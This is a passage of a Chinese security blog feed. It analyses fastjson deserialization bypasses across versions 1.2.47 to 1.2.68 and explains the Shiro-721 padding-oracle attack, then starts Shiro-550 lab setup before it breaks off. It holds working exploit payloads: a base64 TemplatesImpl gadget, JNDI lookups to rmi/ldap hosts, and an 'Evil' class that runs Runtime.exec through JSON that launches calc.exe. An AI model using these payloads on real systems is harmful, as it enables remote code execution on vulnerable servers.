GV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=\&quot;],&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_name\&quot;:\&quot;b1uel0n3\&quot;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_tfactory\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\&quot;&#125;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1.2.48版本修复了cache值默认为true的问题，直接将cache的值改为了false。</p><p><img src="/archives/1970b414/image-20250927155856236.png" alt="image-20250927155856236"></p><h1 id="fastjson-1"><a href="#fastjson-1" class="headerlink" title="fastjson &lt;&#x3D;1.2.62 和 &lt;&#x3D;1.2.66"></a>fastjson &lt;&#x3D;1.2.62 和 &lt;&#x3D;1.2.66</h1><p>积累的两个<code>poc</code>,基于黑名单绕过<code>fastjson &lt;= 1.2.62</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,</span><br><span class="line"><span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span></span><br><span class="line">&#125;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>基于<code>fastjson&lt;=1.2.66</code>的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,</span><br><span class="line"><span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson 1.2.68"></a>fastjson 1.2.68</h1><h2 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>在fastjson 1.2.68版本中，新增了safeMode功能：<br><img src="/archives/1970b414/image-20250927160656008.png" alt="image-20250927160656008"></p><p>在checkAutoType方法下，当safeMode为true，则直接抛出异常。它默认为false</p><p>而在该版本下，在关闭safeMode情况下利用expectClass添加mappings缓存无视AutoType进行反序列化</p><h2 id="利用expectClass添加mapping缓存"><a href="#利用expectClass添加mapping缓存" class="headerlink" title="利用expectClass添加mapping缓存"></a>利用expectClass添加mapping缓存</h2><p>新版本中当缓存找不到类时，同样会经过黑白名单校验，跟着往下走：</p><p><img src="/archives/1970b414/image-20250927164245739.png" alt="image-20250927164245739"></p><p>当expectClassFlag为true会调用TypeUtils.loadClass方法</p><p><img src="/archives/1970b414/image-20250927164643263.png" alt="image-20250927164643263"></p><p>而expectClassFlag与expectClass有关，当expectClass不为null及一些对象时为true，而expectClass为checkAutoType方法的第二个参数，前面版本DefaultJSONParser里调用时都默认为null</p><p><img src="/archives/1970b414/image-20250927165053807.png" alt="image-20250927165053807"></p><p>这个版本也一样，且加了类型名称不能全为数字字符的限制，所以如果要利用还需要在反序列化时需要调用其他类的checkAutoType方法</p><p>继续跟着checkAutoType往下走：</p><p><img src="/archives/1970b414/image-20250927165211596.png" alt="image-20250927165211596"></p><p>当利用loadclass加载到对象后，clazz是通过@type加载的对象，如果这个clazz是expectClass的实现类或子类，就会调用TypeUtils.addMapping将typeName缓存进mappings</p><p>那这里就有思路了，就是通过checkAutoType传入可控的expectClass，且加载的恶意对象是expectClass的实现类或子类，然后将恶意对象缓存进mappings，然后再触发即可</p><p>先解决第一个问题，就是需要要找到一个checkAutoType方法，其默认expectClass不为null且可控，这里全局搜索：</p><p><img src="/archives/1970b414/image-20250927170429416.png" alt="image-20250927170429416"></p><p>可以看到有两处expectClass不为null，分别是JavaBeanDeserializer#deserialze方法和ThrowableDeserializer#deserialze方法</p><h2 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h2><p><img src="/archives/1970b414/image-20250927173503508.png" alt="image-20250927173503508"></p><p>这里调用了checkAutoType，同时需要注意这里<strong>typename的获取是通过解析@type值获取的，expectClass为deserialze方法传入对象的类型</strong></p><p>首先我们要先调用JavaBeanDeserializer类的deserialze方法，即在一开始DefaultJSONParser类中执行deserializer.deserialze需要获取到JavaBeanDeserializer的反序列化器：<br><img src="/archives/1970b414/image-20250927183938563.png" alt="image-20250927183938563"></p><p>而在getDeserializer方法中，如果要加载的类不是上面那些，就会通过createJavaBeanDeserializer方法创建一个JavaBeanDeserializer的反序列化器，所以我们可以找mappings缓存和deserializers存在的类，这里找到AutoCloseable类：<br><img src="/archives/1970b414/image-20250927184409839.png" alt="image-20250927184409839"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br></pre></td></tr></table></figure><p>这时实现了第一步能调用JavaBeanDeserializer.deserialize方法了，且expectClass为deserialze方法传入对象的类型即AutoCloseable</p><p>所以我们需要找一个AutoCloseable的实现类或者子类且这个类的 getter&#x2F;setter&#x2F;static block&#x2F;constructor 方法中含有具有威胁的代码逻辑，这里没找到直接构造一个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;1\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;Evil\&quot;&#125;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;2\&quot;:&#123;\&quot;@type\&quot;:\&quot;Evil\&quot;,\&quot;cmd\&quot;:\&quot;calc.exe\&quot;&#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/archives/1970b414/image-20250927190613044.png" alt="image-20250927190613044"></p><h2 id="ThrowableDeserializer"><a href="#ThrowableDeserializer" class="headerlink" title="ThrowableDeserializer"></a>ThrowableDeserializer</h2><p><img src="/archives/1970b414/image-20250927190914222.png" alt="image-20250927190914222"></p><p>ThrowableDeserializer同样调用了checkAutoType方法，且expectClass为Throwable.class，我们的恶意类exClassName同样是通过@type获得，且需要是Throwable.class的实现类或子类</p><p>同样看获取反序列化器：</p><p><img src="/archives/1970b414/image-20250927190804940.png" alt="image-20250927190804940"></p><p>需要@type的类型为Throwable.class的实现类或子类，看下缓存中是否存在：</p><p><img src="/archives/1970b414/image-20250927191659391.png" alt="image-20250927191659391"></p><p><img src="/archives/1970b414/image-20250927191644536.png" alt="image-20250927191644536"></p><p>这里找到Exception类</p><p>我们还需要找一个Throwable的实现类或者子类且这个类的 getter&#x2F;setter&#x2F;static block&#x2F;constructor 方法中含有具有威胁的代码逻辑，这里没找到直接构造一个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;1\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;Evil\&quot;&#125;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;2\&quot;:&#123;\&quot;@type\&quot;:\&quot;Evil\&quot;,\&quot;cmd\&quot;:\&quot;calc.exe\&quot;&#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/archives/1970b414/image-20250927192326353.png" alt="image-20250927192326353"></p><p>总的流程就是：</p><ul><li>先会通过TypeUtils.loadClass加载第一个@type的java.lang.Exception对象，第一次调用的是DefaultJSONParser的config.checkAutoType方法，第二个参数expectClass默认为null，然后加载对象后获取了Exception对象的反序列化器，这时获取了ThrowableDeserializer对象</li><li>接着进行反序列化调用ThrowableDeserializer.deserialize方法，在该方法中又会获取@type的值作为需要加载的类，此时通过第二个@type获取我们的恶意类Evil，然后在ThrowableDeserializer中调用了checkAutoType方法且第一个参数为恶意类，第二个参数expectClass为Throwable对象</li><li>进入checkAutoType方法后expectClassFlag由于expectClass满足条件值变为true，然后判断恶意类Evil为expectClass的实现类成功而将恶意类加入缓存</li><li>最后反序列化第二个键值对的对象，由于我们恶意类Evil已经进入了缓存，所以加载该类调用setter方法实现RCE</li></ul><h1 id="Fastjson漏洞的对抗史"><a href="#Fastjson漏洞的对抗史" class="headerlink" title="Fastjson漏洞的对抗史"></a>Fastjson漏洞的对抗史</h1><ol><li>1.2.24版本<ul><li>没有任何过滤器，可以直接进行任何类进行反序列化攻击</li><li>典型工具类：<code>TemplatesImpl</code>、<code>JdbcRowSetImpl</code></li></ul></li><li>1.2.25版本<ul><li>引入了<code>checkAutoType</code>机制，加入了黑白名单过滤。</li><li>AutoType机制开启<ul><li>先检查白名单，白名单中的类直接加载</li><li>若不在白名单，继续检查黑名单，若不在黑名单，正常加载</li></ul></li><li>AutoType机制关闭<ul><li>先检查黑名单，若类在黑名单中则抛出异常</li><li>再检查白名单，若不在白名单则抛出异常</li></ul></li><li>但可以通过<code>L...;</code>或者<code>[</code>绕过</li></ul></li><li>1.2.42版本<ul><li>加入对<code>L;</code>的检测，但可通过双写绕过，<code>[</code>不受影响</li><li>黑白名单类名隐去，使用hashcode计算</li></ul></li><li>1.2.43版本<ul><li>加入对<code>LL;;</code>的检测，但依旧能数组绕过</li></ul></li><li>1.2.45版本<ul><li>黑名单机制问题：黑名单无法穷尽所有恶意类</li></ul></li><li>1.2.47版本<ul><li>AutoType1.2.25以后默认关闭，关闭时加载类的流程：<ul><li>先检查mappings缓存。</li><li>在检查deserializers缓存过的类</li></ul></li><li>可通过像mappings中添加恶意类造成漏洞</li></ul></li><li>1.2.68版本<ul><li>引入expectedClass机制，增加了防护，但仍存在逻辑漏洞：<ul><li>特别是针对<code>Throwable</code>类的防护不足。</li></ul></li></ul></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/news/14309">Java中Fastjson各版本漏洞对抗史与总结-先知社区</a></p><p><a href="https://nivi4.notion.site/fastjson-17753526a00246f9b146eca7354b8835#3eda619d83d542d38ed71a51582e7ab5">fastjson配合下的调用链</a></p><p><a href="https://cloud.tencent.com/developer/article/1957185">https://cloud.tencent.com/developer/article/1957185</a></p><p><a href="https://blog.csdn.net/mole_exp/article/details/122315526">https://blog.csdn.net/mole_exp/article/details/122315526</a></p><p><a href="https://www.anquanke.com/post/id/232774">https://www.anquanke.com/post/id/232774</a></p><p><a href="https://xz.aliyun.com/news/15984">https://xz.aliyun.com/news/15984</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> fastjson </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro-721反序列化漏洞</title>
      <link href="/archives/fd34ba6b/"/>
      <url>/archives/fd34ba6b/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.apache.shiro/shiro-core --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.4</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.apache.shiro/shiro-web --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.4</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>在Shiro721中，remeberMe Cookie默认通过AES-128-CBC模式进行加密，这种加密容易受到Padding Oracle Attack攻击，攻击者可通过Padding Oracle加密生成的攻击代码作为remeberMe Cookie的值来实现反序列化前缀</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>Shiro &lt;1.4.2</p><h2 id="对比Shiro-550的改进"><a href="#对比Shiro-550的改进" class="headerlink" title="对比Shiro 550的改进"></a>对比Shiro 550的改进</h2><p>找到org.apache.shiro.mgt.AbstractRememberMeManager类，在Shiro 1.2.4版本中，该类下存在一个默认key，其构造方法将默认key设置为Cookie加解密的密钥:</p><p><img src="/archives/fd34ba6b/image-20250921170356971.png" alt="image-20250921170356971"></p><p>而在Shiro 1.4.1版本中，则不再定义默认key，key是通过<code>cipherService.generateNewKey().getEncoded()</code>来获取</p><p><img src="/archives/fd34ba6b/image-20250921170608595.png" alt="image-20250921170608595"></p><p>而通过测试发现每次生成的key都会发生变化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AesCipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">cipherService.generateNewKey().getEncoded()</span><br></pre></td></tr></table></figure><h2 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h2><h3 id="CBC加解密过程"><a href="#CBC加解密过程" class="headerlink" title="CBC加解密过程"></a>CBC加解密过程</h3><p>加密：</p><p><img src="/./shiro-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F2ad83791-bf15-407e-98fd-812b5d901b6b%252FUntitled.png" alt="img"></p><p>即第一组明文在加密运算前与IV异或；从第二组开始，所有明文都先与前一组密文异或</p><p>解密：<br><img src="/./shiro-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F41e45a53-9318-434c-8f33-474222a2f50d%252FUntitled.png" alt="img"></p><p>解密过程则相反，第一组密文在加密运算前与初始向量IV异或；第二组密文解密后都会和前一组密文异或</p><h3 id="PKCS5填充模式"><a href="#PKCS5填充模式" class="headerlink" title="PKCS5填充模式"></a>PKCS5填充模式</h3><p>因为Shiro主要采用PKCS5方式填充，该模式是以8字节填充，以完整字节填充。当待加密的数据长度刚好满足分组长度的倍数时，仍然需要填充一个分组长度。</p><p><img src="/./shiro-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252Fda8f5284-09ec-4245-bad9-bedaad0865d8%252FUntitled.png" alt="img"></p><h3 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h3><p>异或的特点：</p><ul><li>相同字符之间异或为0</li><li>任何字符与0异或都为本身</li></ul><p>假设我们有第N-1组的密文某一位的值A，也知道第N组密文解密后的中间值与A相同位的值为B，那么我们容易得到第N组该位上的明文C</p><p>但同时，如果我们通过遍历修改第N-1组每一位的值在与中间值异或，那么就能达到控制明文为我们想要的内容</p><p>即通过CBC字节翻转攻击，只要我们能触发加解密过程，且能获得每次加密后的密文，那我们就能在不知道key的情况下，通过修改密文或IV，来控制输出明文为自己想要的内容，且只能从最后一组开始，并且每改完一组，都要重新获取一遍解密后的数据，要根据解密后的数据来修改前一组密文值</p><h3 id="Padding-Oracle-Attack原理"><a href="#Padding-Oracle-Attack原理" class="headerlink" title="Padding Oracle Attack原理"></a>Padding Oracle Attack原理</h3><p>Padding Oracle：在解密时，如果算法发现解密后得到的结果填充方式不符合规则，那么就表示输入数据有问题，对于解密的库来说往往会抛出一个异常来提示Padding不正确。</p><p>Padding Oracle Attack，填充提示攻击，主要通过根据CNC字节翻转攻击、Padding填充规则以及服务端解密后返回的不同状态来穷举中间值进而获取明文的攻击。仅针对CBC分组模式的攻击而不是针对某个加密算法的攻击</p><p>攻击条件：</p><ul><li>攻击者能够获取到密文，以及密文对象的初始向量IV</li><li>攻击者能够触发密文的解密过程，并且能够知道密文的解密结果是否正确</li></ul><p>服务器对于使用CBC模式加密敏感信息进行操作时，先是检测密文最后一组的填充值是否正确来确定能否进行正常解密，如果错误直接返回错误，如果正确则进一步判断解密后的内容是否正确</p><p>一般分为三种情况：</p><ul><li>密文不能解密</li><li>密文能解密但解密结果不对</li><li>密文能解密且结果正确</li></ul><p>攻击者可以通过服务端解密后的响应状态来判断填充的字节是否正确来进行穷举攻击</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Shiro就是通过不同情况Cookie时服务器的响应来进行穷举的</p><p>有三种情况：</p><ul><li>Padding错误</li><li>padding正确，反序列化失败</li><li>反序列化成功</li></ul><p>注意：对于Java来说，反序列化是以Stream的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化，也就是Java序列化数据后的脏数据不影响反序列化结果。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> shiro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro-550反序列化漏洞</title>
      <link href="/archives/2f569ddd/"/>
      <url>/archives/2f569ddd/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>为了让浏览器或服务器重启后用户不丢失状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的remeberMe字段中，下次读取时再进行反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密Key，导致攻击者可以伪造任意的remeberMe Cookie，进而触发反序列化漏洞。</p><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>第一种：返回包中包含<code>rememberMe=deleteMe</code>字段</p><p>第二种：直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的cookie中增加字段<code>rememberMe=</code>然后查看返回数据包中是否存在关键字</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><strong>jdk 8u65</strong></li><li><strong>Tomcat:9.0.73</strong></li><li><strong>commons-beautils:1.8.3</strong></li><li><strong>commons-collections:3.2.1</strong></li><li><strong>commons-logging:1.2</strong></li><li><strong>shiro-web:1.2.4</strong></li><li><strong>shiro-core:1.2.4</strong></li><li><strong>slf4j-api:1.7.30</strong></li><li><strong>slf4j-simple:1.7.30</strong></li></ul><p>其中：</p><ul><li><strong>shiro-core、shiro-web是shiro本身的依赖</strong></li><li><strong>slf4j-api、slf4j-simple是为了显示shiro中的报错信息添加的依赖</strong></li><li><strong>commons-logging是shiro中用到的一个接口，不添加会报错</strong></li><li><strong>Tomcat中会用到jsp-api、javax.servlet-api依赖，仅在编译时使用</strong></li></ul><p>Tomcat自行下载，pom.xml添加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Apache Commons BeanUtils --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Apache Commons Collections (存在反序列化漏洞的版本) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Apache Commons Logging --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Apache Shiro Web --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Apache Shiro Core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span 